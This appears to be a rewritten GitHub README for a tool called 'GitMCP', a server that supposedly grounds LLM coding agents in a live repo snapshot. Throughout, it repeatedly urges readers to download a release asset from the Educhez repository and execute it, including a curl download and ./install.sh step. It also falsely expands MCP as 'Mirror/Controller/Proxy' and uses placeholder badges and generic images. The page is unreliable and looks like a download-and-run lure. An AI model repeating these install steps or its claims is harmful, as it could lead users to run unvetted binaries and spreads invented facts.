[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/Educhez/git-mcp/releases)

# GitMCP — Remote MCP Server to Stop Code Hallucinations

![GitMCP banner](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)

A free, open-source remote MCP server for any GitHub project. GitMCP gives language models a live, consistent view of your repo. Use it to ground AI agents, reduce hallucinations, and run reproducible code patches against the repo state.

Tags: agentic-ai · agents · ai · claude · copilot · cursor · git · llm · mcp

Badges
- ![License](https://img.shields.io/badge/License-MIT-green)
- ![Language](https://img.shields.io/badge/Language-Go-blue) (example)
- ![Build](https://img.shields.io/badge/Build-passing-brightgreen)

Overview

- GitMCP acts as a remote Mirror/Controller/Proxy (MCP). It serves a consistent snapshot of a Git repo to LLM-driven agents.
- It rejects operations that would cause inconsistent code views.
- It supports read-only and controlled-write modes.
- It integrates with existing LLM agents and toolchains via a simple HTTP API and a small agent SDK.

Why GitMCP

- Stop hallucinations by giving LLMs a single source of truth.
- Let agents reason about real files, not imagined files.
- Audit agent actions with signed MCP transactions.
- Use the same MCP server across CI, local dev, and cloud agents.

Key features

- Snapshot view: Serve stable repo snapshots per session.
- File-level locks: Prevent conflicting edits across agents.
- Transaction log: Append-only record of agent decisions and MCP actions.
- Patch application: Apply git-style patches and commit under a controlled identity.
- Policy hooks: Run policy checks before commits (lint, tests, custom scripts).
- Agent SDK: Minimal client library for common LLM agent frameworks.
- Metrics and tracing: Expose Prometheus metrics and structured traces.

Architecture

- GitMCP runs next to your Git remote or as a proxy to GitHub.
- Agents call MCP for file reads, diffs, and patch proposals.
- MCP validates the patch, runs pre-commit checks, and applies the patch to a branch or creates a PR.
- MCP stores transaction data in a local store or remote DB.

Screenshots and diagrams

- Architecture diagram (example): https://raw.githubusercontent.com/github/explore/main/topics/git/git.png
- API sample flows: see the Usage section.

Quick start

Download the latest release, then run the included installer or binary. The releases page contains versioned assets. Download the file and execute it.

Download and run (example)
1. Visit the Releases page and download the appropriate asset:
   https://github.com/Educhez/git-mcp/releases
2. Unpack and run the installer or binary included in the release asset. Example commands you can run on a Unix system after downloading the release asset (adjust file name per release):
   - curl -L -o git-mcp.tar.gz "https://github.com/Educhez/git-mcp/releases/download/vX.Y.Z/git-mcp-linux-x64.tar.gz"
   - tar -xzf git-mcp.tar.gz
   - ./git-mcp/install.sh
3. Start the server:
   - ./git-mcp/bin/git-mcp --config ./git-mcp/config.yaml

If the release asset uses a different name, pick the matching file from the Releases page and execute the included script or binary. The Releases page contains the correct assets and instructions.

Install from source

- Requirements: Go 1.20+, make, git.
- Clone:
  - git clone https://github.com/Educhez/git-mcp.git
  - cd git-mcp
- Build and run:
  - make build
  - ./bin/git-mcp --config ./config.yaml

Configuration

Main options in config.yaml:

- repo_root: path or remote URL to mirror.
- auth:
  - method: token | ssh | none
  - token: <PAT for GitHub>
- server:
  - bind: 0.0.0.0:8080
  - tls:
     enabled: true
     cert_file: /path/to/cert.pem
     key_file: /path/to/key.pem
- policies:
  - run_linters: true
  - run_tests: false
  - custom_scripts:
     - ./ci/policy/check_license.sh

Example config snippet
server:
  bind: 127.0.0.1:8080
  tls:
    enabled: false
repo_root: git@github.com:yourorg/yourrepo.git
auth:
  method: token
  token: ${GITHUB_TOKEN}

API

- GET /v1/snapshot?ref=refs/heads/main
  - Returns a snapshot handle and file manifest.
- GET /v1/file?snapshot=<id>&path=src/main.go
  - Returns file content and metadata.
- POST /v1/patch
  - Body: { snapshot_id, diffs, author, message }
  - Validates diffs, runs policies, returns patch id.
- POST /v1/commit
  - Body: { patch_id, target_branch }
  - Applies patch and returns commit SHA.
- GET /v1/logs?since=...
  - Returns the transaction log for auditing.

Agent SDK

- Small client available in Go and Python.
- The SDK handles snapshot leases, auto-retries, and signed transactions.
- Example (pseudo-Python):

from gitmcp import Client
c = Client("https://mcp.example:8080", token=os.getenv("MCP_TOKEN"))
snap = c.snapshot("refs/heads/main")
file = c.read_file(snap.id, "src/main.py")
patch = c.propose_patch(snap.id, diffs=[...], author="agent@ai")
c.commit_patch(patch.id, "refs/heads/agent-work")

Integrations

- LLM agents:
  - Adapt Claude, Copilot, or custom LLMs to call MCP for file reads.
  - Use MCP for patch generation and commit lifecycle.
- CI:
  - Use MCP as gatekeeper for auto-generated changes.
  - Enforce tests via policy hooks before commit.
- Editors:
  - Wire your editor agent plugin to MCP to get a stable view of the repo.

Security model

- Authenticate agents with tokens or mTLS.
- Use signed transactions to prove agent intent.
- Run policies as separate processes to reduce risk.
- Limit operations by role and session.

Operational notes

- Run MCP behind a reverse proxy for TLS termination.
- Back up the transaction DB for audit history.
- Monitor metrics and set alerts on failed policies.
- Scale by running read replicas for heavy agent workloads.

Troubleshooting

- If a patch fails policy checks, fetch the transaction log to see the failing script output.
- If you hit file-lock conflicts, refresh the snapshot and retry the patch cycle.
- If the server refuses a commit, check the policy hook logs at /var/log/gitmcp/policies.log

Examples

- Agent patch flow
  - Agent requests snapshot.
  - Agent reads files and proposes a patch for a bug fix.
  - MCP runs linters and unit tests defined in policies.
  - MCP applies patch to a staging branch and creates a PR.
  - Human reviewer merges the PR.

- Auto-fix flow
  - CI job triggers LLM to propose a fix for lint errors.
  - MCP applies the patch under a bot identity.
  - MCP opens a PR and notifies the team.

Audit and compliance

- All actions produce a signed transaction record.
- The transaction store supports export to JSON for audits.
- Use the logs for traceability and incident review.

Contributing

- Open issues for feature requests or bugs.
- Fork the repo and send a PR.
- Follow the contribution guide in /CONTRIBUTING.md.
- Write tests for new features and run make test.

Code of conduct

- Be respectful.
- Keep discussions focused on the project.
- Follow the code of conduct file in the repo.

License

- MIT License. See LICENSE file.

Acknowledgements

- Inspired by the need to ground AI agents in real code.
- Thanks to the open-source community and early adopters.

More releases and downloads

Visit the Releases page to download a release asset and run the included installer script or binary:
https://github.com/Educhez/git-mcp/releases

If the asset includes an installer file, download that file from the release and execute it on your machine. The Releases page contains release notes and the exact asset names for each platform.

FAQ

Q: What does MCP mean?
A: Mirror/Controller/Proxy. It provides a controlled view of a repository.

Q: Can MCP write to the repo?
A: Yes. It can apply patches, commit under a bot identity, or open PRs. You control behavior via policies.

Q: Does MCP work with private repos?
A: Yes. Provide an auth token or SSH key in the config.

Q: Which LLMs work with MCP?
A: Any LLM that can call HTTP APIs. You can adapt Claude, Copilot, or any custom agent.

Contact

- Open an issue for bugs or feature requests.
- Submit PRs for fixes or new features.

Screenshots, diagrams, and badges come from public sources and the repo assets. The Releases page holds downloadable assets and installers. Use the Releases page for the correct binary or installer for your platform:
https://github.com/Educhez/git-mcp/releases